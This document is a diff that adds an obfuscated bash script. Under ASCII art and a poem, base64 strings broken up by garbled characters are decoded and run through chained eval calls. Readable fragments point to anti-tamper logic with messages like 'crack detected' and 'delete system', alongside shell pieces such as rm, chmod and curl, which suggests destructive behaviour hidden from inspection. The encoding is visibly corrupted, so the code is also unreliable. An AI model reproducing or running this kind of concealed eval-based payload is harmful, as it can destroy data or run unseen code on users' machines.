@@ -1,0 +1,50 @@
+#
+#
+#
+#
+#
+#гЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂ гЃёгЂЂгЂЂгЂЂгЂЂ   пјЏ|
+#гЂЂгЂЂгЂЂдєєгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂ/пјј7гЂЂгЂЂ   в€ пјї/
+#гЂЂгЂЂгЂЂжњ‰гЂЂгЂЂгЂЂгЂЂгЂЂгЂЂ /гЂЂв”‚гЂЂгЂЂ пјЏгЂЂпјЏ
+#гЂЂгЂЂгЂЂж‚ІгЂЂжњ€гЂЂгЂЂгЂЂгЂЂв”‚гЂЂZ пјї,пјњгЂЂпјЏгЂЂгЂЂ /`гѓЅ
+#гЂЂгЂЂгЂЂж¬ўгЂЂжњ‰гЂЂгЂЂгЂЂгЂЂв”‚гЂЂгЂЂгЂЂгЂЂгЂЂгѓЅгЂЂгЂЂ /гЂЂгЂЂгЂ‰
+#гЂЂгЂЂгЂЂз¦»гЂЂйґгЂЂгЂЂгЂЂгЂЂ YгЂЂгЂЂгЂЂгЂЂгЂЂ  `гЂЂ /гЂЂпјЏ
+#гЂЂгЂЂгЂЂеђ€гЂЂж™ґгЂЂгЂЂгЂЂгЂЂпЅІв—ЏгЂЂпЅ¤гЂЂв—ЏгЂЂгЂЂвЉ‚вЉѓ гЂ€гЂЂгЂЂ
+#гЂЂгЂЂгЂЂгЂЂгЂЂењ†гЂЂгЂЂгЂЂгЂЂ()гЂЂ гЃёгЂЂгЂЂгЂЂгЂЂ|гЂЂпјјгЂ€
+#гЂЂгЂЂгЂЂгЂЂгЂЂзјєгЂЂгЂЂгЂЂгЂЂгЂЂ>пЅ° пЅ¤_гЂЂ г‚ЈгЂЂ в”‚ пјЏпјЏ
+#гЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂ / гЃёгЂЂгЂЂ /гЂЂпѕ‰пјњ| пјјпјј
+#гЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂ гѓЅ_пѕ‰гЂЂгЂЂ(_пјЏгЂЂ в”‚пјЏпјЏ
+#гЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂ/ гЂЂ рќ—–рќ—Ў_рќ—јрќ—Їрќ—¶    |пјЏ
+#гЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂгЂЂпјћвЂ•rпїЈпїЈ`пЅ°вЂ•пјї  |
+#
+#      гЂЂгЂЂ    ж­¤дє‹еЏ¤йљѕе…ЁгЂЂгЂЂдЅ†ж„їдєєй•їд№…гЂЂгЂЂеЌѓй‡Ње…±е©µеЁџ
+#          
+#+----------------------------------------------------------------------------------------------------------------+
+#гЂЂгЂЂ@рќђЏрќђ”рќђЃрќђ†рќђЊрќђЋрќђ›рќђўрќђ‚рќђЎрќђћрќђљрќђ­рќђ¬гЂЂгЂЂ@рќђ“рќђћрќђ¬рќђ­рќђЂрќђњрќђњрќђЁрќђ®рќђ§рќђ­рќђЊрќђљрќђ«рќђ¤гЂЂгЂЂ@рќђ‚рќђЌ_рќђЁрќђ›рќђў
+#+----------------------------------------------------------------------------------------------------------------+
+#
+#
+#
+#
+
+BMegvuEnFhzVZFMzOBVlwbepPoqOGaeVS=("ejЃюЊфЦЌ¬°ЦЅнмЈ}i" "IjtIQno9J1szMjsnO1VCej0naSAgICдяЪЙ…џъѕ“є„¤±ќу7UkJ6PSдяЪЙ…џъѕ“є„¤±ќуgICAgJzt1Q3o9Jy1uOzsnO2lEej0ndCdдяЪЙ…џъѕ“є„¤±ќуJyдяЪЙ…џъѕ“є„¤±ќуnO0FEej0nIiQwIiдяЪЙ…џъѕ“є„¤±ќу7RHo9J+WKoOWvhueOr+WigyдяЪЙ…џъѕ“є„¤±ќу7aEJ6PSdpbnRmJztTRHo9JyIpIDInO2tEej0nICIkдяЪЙ…џъѕ“є„¤±ќуyдяЪЙ…џъѕ“є„¤±ќу7WUR6PSдяЪЙ…џъѕ“є„¤±ќуwIjtlJztTej0nLy9odCдяЪЙ…џъѕ“є„¤±ќу7bEN6PSduJ1wnJyB8JztwQno9J3RhL2wnO3BEej0nIOW3suWKoOWvhiдяЪЙ…џъѕ“є„¤±ќу7VEJ6PSdOX29iJztrQ3o9JyAnXCдяЪЙ…џъѕ“є„¤±ќуnWFwnO0tCej0nMDMzWyдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќуno9J+eOr+Wig+W8guW4uCдяЪЙ…џъѕ“є„¤±ќу7eUN6PSдяЪЙ…џъѕ“є„¤±ќуgKzIgJztuej0nIHRoZSдяЪЙ…џъѕ“є„¤±ќу7SkJ6PSflhaXmlofku7ZдяЪЙ…џъѕ“є„¤±ќуJztlQ3o9Jz1gYmEnO0REej0nZCA+ICдяЪЙ…џъѕ“є„¤±ќу7a3o9JyJCeT0nO2N6PSdwдяЪЙ…џъѕ“є„¤±ќуFBhJzttRHo9J3RfY28nO25Dej0nbCAtbiдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќуHo9J1xuIiдяЪЙ…џъѕ“є„¤±ќу7b0J6PSдяЪЙ…џъѕ“є„¤±ќу9L2RhJztwQ3o9JzI+L2QnO1R6PSдяЪЙ…џъѕ“є„¤±ќуvL3JhJztOQno9JyAtдяЪЙ…џъѕ“є„¤±ќуiAnO1lDej0n5qOA5rWL5Yiw56C0JztKej0nJChjdSдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќуUN6PSdldi9uJztFej0nLi4uIiдяЪЙ…џъѕ“є„¤±ќу7b0R6PSd0IiA+JztLQ3o9J3AgInInO0N6PSfmraPlnKjliJvlu7onO1BDej0nMTtjPSдяЪЙ…џъѕ“є„¤±ќу7Q0V6PSdzaCдяЪЙ…џъѕ“є„¤±ќу7WEJ6PSdzY3JpJzttej0nKSBdOyдяЪЙ…џъѕ“є„¤±ќу7ZER6PSдяЪЙ…џъѕ“є„¤±ќуnXCдяЪЙ…џъѕ“є„¤±ќуnJXNдяЪЙ…џъѕ“є„¤±ќуJztaRHo9J2xzZSAnO0xEej0nNzдяЪЙ…џъѕ“є„¤±ќу3ICдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќуUR6PSдяЪЙ…џъѕ“є„¤±ќуuдяЪЙ…џъѕ“є„¤±ќу2gnO1pDej0n6KejLOato+WдяЪЙ…џъѕ“є„¤±ќуqCдяЪЙ…џъѕ“є„¤±ќу7dUR6PSдяЪЙ…џъѕ“є„¤±ќу7IGVjJztSQ3o9J2JhдяЪЙ…џъѕ“є„¤±ќу2UnO2Z6PSdhaW4vJztRQno9J1N9ICAnO1d6PSd1дяЪЙ…џъѕ“є„¤±ќу2VyJztPQ3o9JyIgMCAnO0JCej0nMzU7MSдяЪЙ…џъѕ“є„¤±ќу7eUJ6PSdhдяЪЙ…џъѕ“є„¤±ќу2tgJzt2ej0nZXhpdCдяЪЙ…џъѕ“є„¤±ќу7UUR6PSдяЪЙ…џъѕ“є„¤±ќуgLWZyJztDQno9J20nXCдяЪЙ…џъѕ“є„¤±ќуnJztZej0nZW50LiдяЪЙ…џъѕ“є„¤±ќу7WEN6PSdobyAiJztXQno9J25дяЪЙ…џъѕ“є„¤±ќуbiInO05Eej0nbGVlдяЪЙ…џъѕ“є„¤±ќуCдяЪЙ…џъѕ“є„¤±ќу7YkR6PSdudGYgJztMQno9JzBtXG4nO0ZEej0nOyB0aCдяЪЙ…џъѕ“є„¤±ќу7QkN6PSdzayA3JztKQ3o9Jzt0дяЪЙ…џъѕ“є„¤±ќуmEnO0FDej0nO3VtYSдяЪЙ…џъѕ“є„¤±ќу7Tno9Jy8vbWknO2ZDej0nдяЪЙ…џъѕ“є„¤±ќу2U2NCдяЪЙ…џъѕ“є„¤±ќу7V0R6PSдяЪЙ…џъѕ“є„¤±ќуgIiRmJztvQ3o9JyArMSAnO3JCej0nZm91biдяЪЙ…џъѕ“є„¤±ќу7Rno9J2lmIFsnO1hEej0nIiAiJCдяЪЙ…џъѕ“є„¤±ќу7aXo9J3JlдяЪЙ…џъѕ“є„¤±ќуCAnO0RFej0n5Yqg5a+G5a6M5oiQJzttQ3o9JyB0YWknO0h6PSдяЪЙ…џъѕ“є„¤±ќу9b2JpJztEQ3o9J2Bta3QnO3hCej0nPWB1bSдяЪЙ…џъѕ“є„¤±ќу7b3o9J24nO1FDej0nJGIvYCдяЪЙ…џъѕ“є„¤±ќу7bkR6PSdudGVuJztNRHo9JzsgKHMnO3d6PSдяЪЙ…џъѕ“є„¤±ќуgMSдяЪЙ…џъѕ“є„¤±ќу7THo9J3MgaHQnO0FFej0nID4+ICдяЪЙ…џъѕ“є„¤±ќу7TUJ6PSdyZWFkJztMQ3o9J20gLWYnO3NDej0nIGluICдяЪЙ…џъѕ“є„¤±ќу7SUN6PSdYWCJgJztnRHo9JyI7ZmknO2xCej0n77yBIjtlJztSRHo9JyAiJGInO1ZCej0nMjMgXCдяЪЙ…џъѕ“є„¤±ќу7QXo9J3ByaW4nO2lCej0nICLor7fku6UnO3RDej0nWClkPSдяЪЙ…џъѕ“є„¤±ќу7ZHo9J3Nzd28nO1dDej0nWDtlYyдяЪЙ…џъѕ“є„¤±ќу7bUJ6PSd4aXQ7JztVQ3o9JyJgO2QnO1p6PSdjb20vJztTQ3o9J25hbWUnO0NEej0nLWMgLSдяЪЙ…џъѕ“є„¤±ќу7eER6PSdpдяЪЙ…џъѕ“є„¤±ќуCAtJztOQ3o9JyRiXCInO01Dej0nдяЪЙ…џъѕ“є„¤±ќуiBдяЪЙ…џъѕ“є„¤±ќуIiдяЪЙ…џъѕ“є„¤±ќу7R0N6PSдяЪЙ…џъѕ“є„¤±ќуke2F9Jztsej0nb2JpIiдяЪЙ…џъѕ“є„¤±ќу7dkJ6PSдяЪЙ…џъѕ“є„¤±ќуkYTt1JztCej0ndGYgIiдяЪЙ…џъѕ“є„¤±ќу7akN6PSдяЪЙ…џъѕ“є„¤±ќуgYHByJztTQno9J1RHOkMnO3ZDej0nKilkPSдяЪЙ…џъѕ“є„¤±ќу7SEN6PSdYWFhYJztQej0nLmdoдяЪЙ…џъѕ“є„¤±ќуCдяЪЙ…џъѕ“є„¤±ќу7aHo9JyB8IGдяЪЙ…џъѕ“є„¤±ќуnO3l6PSdST1M9JztrQno9J+adg+mZkOaJp+ihjCдяЪЙ…џъѕ“є„¤±ќу7Q0N6PSдяЪЙ…џъѕ“є„¤±ќу3O2I9JztVRHo9J3YvbnUnO2ZEej0n5peg5rOV6Kej5a+GJztkQ3o9J2QiO2YnO0l6PSдяЪЙ…џъѕ“є„¤±ќуiID0gJztnQno9J24gдяЪЙ…џъѕ“є„¤±ќуHInO1J6PSдяЪЙ…џъѕ“є„¤±ќуuY29tJzt1ej0nIiдяЪЙ…џъѕ“є„¤±ќу7dER6PSdmaWxlJztkQno9JyAtbmUnO096PSdyдяЪЙ…џъѕ“є„¤±ќуm9yJztuQno9J2ZpO2EnO2NCej0nIC11YCдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќу0R6PSдяЪЙ…џъѕ“є„¤±ќуgJGluJztHej0nICJCeSдяЪЙ…џъѕ“є„¤±ќу7VkN6PSдяЪЙ…џъѕ“є„¤±ќу9JGIvJztGQno9J1xuXG4nO3ZEej0naG8pICдяЪЙ…џъѕ“є„¤±ќу7aEN6PSдяЪЙ…џъѕ“є„¤±ќуkZGA7JztpQ3o9J2NhдяЪЙ…џъѕ“є„¤±ќу2UnO3N6PSдяЪЙ…џъѕ“є„¤±ќуs6K+36YeN5pawJztHRHo9J2VuICAnO2ZCej0nO3RoZSдяЪЙ…џъѕ“є„¤±ќу7dUJ6PSдяЪЙ…џъѕ“є„¤±ќуgLXAgJztnej0nдяЪЙ…џъѕ“є„¤±ќу2gxMSдяЪЙ…џъѕ“є„¤±ќу7SUJ6PSдяЪЙ…џъѕ“є„¤±ќуxbeivt+i+kyдяЪЙ…џъѕ“є„¤±ќу7VkR6PSdsbCYgJzt0Qno9J2tkaXInO2pCej0nUk9PVCдяЪЙ…џъѕ“є„¤±ќу7YUR6PSдяЪЙ…џъѕ“є„¤±ќуgдяЪЙ…џъѕ“є„¤±ќуHJpJztURHo9Jz4vZGUnO1V6PSd3LmdpJzt3RHo9J3wgZ3onO1pCej0nb250ZSдяЪЙ…џъѕ“є„¤±ќу7RUN6PSdlbXAgJztIRHo9J3VtYXMnO0dCej0nXDAzMyдяЪЙ…џъѕ“є„¤±ќу7ZUR6PSduJ1wnJyAiJztCRXo9J+W3suWKoOWvhi4nO3F6PSdlbHNlJztYej0nY29udCдяЪЙ…џъѕ“є„¤±ќу7akR6PSdlY2hvJztsRHo9J2NyaXAnO0VEej0nIiRjIiдяЪЙ…џъѕ“є„¤±ќу7UEJ6PSdsZSдяЪЙ…џъѕ“є„¤±ќу7UXo9J3JveHknO09Cej0naW5maSдяЪЙ…џъѕ“є„¤±ќу7aER6PSдяЪЙ…џъѕ“є„¤±ќу7ZXhpJzt4ej0nZmknO0RCej0nJHtSTyдяЪЙ…џъѕ“є„¤±ќу7eUR6PSdjIC05JztLRHo9J21vZCAnO2NDej0nPiAiJCдяЪЙ…џъѕ“є„¤±ќу7QUJ6PSдяЪЙ…џъѕ“є„¤±ќуnXCдяЪЙ…џъѕ“є„¤±ќуnXGVbJztKRHo9JzsgY2gnO1BEej0nOyBybSдяЪЙ…џъѕ“є„¤±ќу7YkJ6PSдяЪЙ…џъѕ“є„¤±ќуgYGlkJzthQ3o9J+WIoOmZpOezu+e7nyдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќуUJ6PSdvдяЪЙ…џъѕ“є„¤±ќу3QrJztPRHo9JyAwLjEnO1Z6PSd0aHViJzt3Qno9J21hдяЪЙ…џъѕ“є„¤±ќу2snO2FCej0nbnQ9J1wnJyдяЪЙ…џъѕ“є„¤±ќу7ZUJ6PSдяЪЙ…џъѕ“є„¤±ќуgMCBdJztyRHo9JyhjYXQnO0t6PSdybCAtJztqej0nLXdvICдяЪЙ…џъѕ“є„¤±ќу7Y0R6PSдяЪЙ…џъѕ“є„¤±ќу+JjIgJztiQ3o9J+WIhuWMuiIgJztCRHo9J3ppдяЪЙ…џъѕ“є„¤±ќуCAnO3hDej0nYztpZiдяЪЙ…џъѕ“є„¤±ќу7YXo9J0NOLW8nO0VCej0nU31дяЪЙ…џъѕ“є„¤±ќуbiдяЪЙ…џъѕ“є„¤±ќу7dHo9J+i/kOihjOiEmuaдяЪЙ…џъѕ“є„¤±ќуrCдяЪЙ…џъѕ“є„¤±ќу7дяЪЙ…џъѕ“є„¤±ќуkN6PSd1bGxgJztiej0nYmkvQyдяЪЙ…џъѕ“є„¤±ќу7RkN6PSдяЪЙ…џъѕ“є„¤±ќуtZCAiJztzQno9J2QvO20nO2dDej0nIC1kICдяЪЙ…џъѕ“є„¤±ќу7WUJ6PSdwdF9jJztJRHo9J2sgJHUnO2V6PSdyZC9tJzt3Q3o9JztlдяЪЙ…џъѕ“є„¤±ќу2EnO016PSd0дяЪЙ…џъѕ“є„¤±ќуHM6JztUQ3o9JyAiJDAnOw==" "ZXZhbCAiJ}ыЗµ†У№К‹ЧЎодј F6J}ыЗµ†У№К‹ЧЎодј J6J}ыЗµ†У№К‹ЧЎодј N6J}ыЗµ†У№К‹ЧЎодј R6J}ыЗµ†У№К‹ЧЎодј V6JHokRnokR3okSHokSXokSnokS3okTHokTXokTnokT3okUHokUXokUnokU3okTXokVHokVXokVnokV3okWHokWXokWnokYXokYnokY3okZHokZXokZnokZ3okaHokaXokanoka3okbHokbXokbnokb3okeiRBeiRCeiRweiR6JHF6JHokQXokQnokcnokc3okdHokdXokeiR2eiR3eiR6JHh6JHokeXokQUJ6J}ыЗµ†У№К‹ЧЎодј JCeiRDQnokeiRBeiRCeiR}ыЗµ†У№К‹ЧЎодј QnokRUJ6J}ыЗµ†У№К‹ЧЎодј ZCeiRGQnokRkJ6JHV6JHokQXokQnokR0J6J}ыЗµ†У№К‹ЧЎодј hCeiRJQnokSkJ6J}ыЗµ†У№К‹ЧЎодј tCeiRMQnokdXokeiRNQnokTkJ6J}ыЗµ†У№К‹ЧЎодј 9CeiRQQnokeiRBeiRCeiR}ыЗµ†У№К‹ЧЎодј QnokUUJ6JFJCeiRSQnokU0J6JFRCeiRVQnokVkJ6JFdCeiR6JFhCeiRZQnokWkJ6JGFCeiRGeiRiQnokY0J6JGRCeiRlQnokZkJ6JGdCeiRoQnokaUJ6JGpCeiRrQnokb}ыЗµ†У№К‹ЧЎодј J6JG1CeiRuQnokb0J6JHBCeiRxQnokckJ6JHNCeiR0QnokdUJ6JHZCeiR3Qnoke}ыЗµ†У№К‹ЧЎодј J6JHlCeiRBQ3okQkN6J}ыЗµ†У№К‹ЧЎодј NDeiR}ыЗµ†У№К‹ЧЎодј Q3okRUN6J}ыЗµ†У№К‹ЧЎодј ZDeiRHQ3okS}ыЗµ†У№К‹ЧЎодј N6J}ыЗµ†У№К‹ЧЎодј lDeiRKQ3okS0N6J}ыЗµ†У№К‹ЧЎодј xDeiRNQ3okTkN6J}ыЗµ†У№К‹ЧЎодј 9DeiRQQ3okUUN6JFJDeiRTQ3okV}ыЗµ†У№К‹ЧЎодј N6JFVDeiRWQ3okV0N6JFhDeiRZQ3okWkN6JGFDeiRiQ3okY0N6JGRDeiRlQ3okZkN6JGdDeiRoQ3okaUN6JGpDeiRoQnoka0N6JGxDeiRtQ3okbkN6JG9DeiRwQ3okcUN6JHJDeiRzQ3okd}ыЗµ†У№К‹ЧЎодј N6JHVDeiR2Q3okd0N6JHhDeiRtQ3okbkN6JHlDeiRBRHokaHokQkR6J}ыЗµ†У№К‹ЧЎодј N}ыЗµ†У№К‹ЧЎодј eiR}ыЗµ†У№К‹ЧЎодј RHokRUR6J}ыЗµ†У№К‹ЧЎодј Z}ыЗµ†У№К‹ЧЎодј eiRHRHokS}ыЗµ†У№К‹ЧЎодј R6J}ыЗµ†У№К‹ЧЎодј l}ыЗµ†У№К‹ЧЎодј eiR3QnokSkR6J}ыЗµ†У№К‹ЧЎодј t}ыЗµ†У№К‹ЧЎодј eiRMRHokRUR6J}ыЗµ†У№К‹ЧЎодј 1}ыЗµ†У№К‹ЧЎодј eiRORHokT0R6JFB}ыЗµ†У№К‹ЧЎодј eiRRRHokUkR6JFN}ыЗµ†У№К‹ЧЎодј eiRURHokVUR6JFZ}ыЗµ†У№К‹ЧЎодј eiRFRHokV0R6JFh}ыЗµ†У№К‹ЧЎодј eiRZRHokWkR6JGF}ыЗµ†У№К‹ЧЎодј eiRiRHokY0R6JGR}ыЗµ†У№К‹ЧЎодј eiRlRHokZkR6JGd}ыЗµ†У№К‹ЧЎодј eiRoRHokaUR6JHokakR6JGt}ыЗµ†У№К‹ЧЎодј eiRsRHokbUR6JG5}ыЗµ†У№К‹ЧЎодј eiRvRHokc}ыЗµ†У№К‹ЧЎодј R6JHF}ыЗµ†У№К‹ЧЎодј eiR6JHJ}ыЗµ†У№К‹ЧЎодј eiRzRHokd}ыЗµ†У№К‹ЧЎодј R6JHV}ыЗµ†У№К‹ЧЎодј eiR2RHokd0R6JHh}ыЗµ†У№К‹ЧЎодј eiR5RHokQUV6J}ыЗµ†У№К‹ЧЎодј JFeiRDRXokeiRBeiRCeiR}ыЗµ†У№К‹ЧЎодј RXokdXoi")
+eval $(echo dXN2Vm1Obkx5S3ZYelNXdHlqSWlPYk9seEd6RVZZdkxBPSIiCg==|base64 -d)
+iFTcWiYcMdMBuHyVHsfzVeStaqOgtrfdw()
+{
+	jJiALxlLuOmIKygMPgyezAUWzmaTnuZIZ="
+"
+eval $(echo dXN2Vm1Obkx5S3ZYelNXdHlqSWlPYk9seEd6RVZZdkxBPSR1c3ZWbU5uTHlLdlh6U1d0eWpJaU9iT2x4R3pFVll2TEEkakppQUx4bEx1T21JS3lnTVBneWV6QVVXem1hVG51WklaJEA=|base64 -d)
+}
+EWEvFWqFuHofQKOSdDlzLefnJQNCWiuSg()
+{
+	hqbQoPXomhVcYNGUONogaBZUupRgmvRIF=$2
+	dgMmcKZXgTSUxhSRlcSUfZyYQJlczcZNL=${BMegvuEnFhzVZFMzOBVlwbepPoqOGaeVS[$hqbQoPXomhVcYNGUONogaBZUupRgmvRIF]}
+	OYfpYVvWXdjtoCDMpOyhdlvhOebAkXIEB=$(echo $dgMmcKZXgTSUxhSRlcSUfZyYQJlczcZNL| sed "s/$4/$3/g")
+	PzdlmaxtXeNOslGWqcTKIDNFpkqVxYwpp=$(echo $OYfpYVvWXdjtoCDMpOyhdlvhOebAkXIEB|base64 -d)
+	eval $(echo aUZUY1dpWWNNZE1CdUh5VkhzZnpWZVN0YXFPZ3RyZmR3ICRQemRsbWF4dFhlTk9zbEdXcWNUS0lETkZwa3FWeFl3cHA=|base64 -d)
+}
+
+eval $(echo RVdFdkZXcUZ1SG9mUUtPU2REbHpMZWZuSlFOQ1dpdVNnICRCTWVndnVFbkZoelZaRk16T0JWbHdiZXBQb3FPR2FlVlMgMCAiMCIgIoH+jPSY1o2ssNa97eyjfSI=|base64 -d)
+eval $(echo RVdFdkZXcUZ1SG9mUUtPU2REbHpMZWZuSlFOQ1dpdVNnICRCTWVndnVFbkZoelZaRk16T0JWbHdiZXBQb3FPR2FlVlMgMSAiYyIgIuT/2smFn/q+k7qEpLGd8yI=|base64 -d)
+eval $(echo RVdFdkZXcUZ1SG9mUUtPU2REbHpMZWZuSlFOQ1dpdVNnICRCTWVndnVFbkZoelZaRk16T0JWbHdiZXBQb3FPR2FlVlMgMiAiRSIgIn37x7WG07nKi9eh7uS8oCI=|base64 -d)
+eval $(echo ZXZhbCAiJHVzdlZtTm5MeUt2WHpTV3R5aklpT2JPbHhHekVWWXZMQSI=|base64 -d)
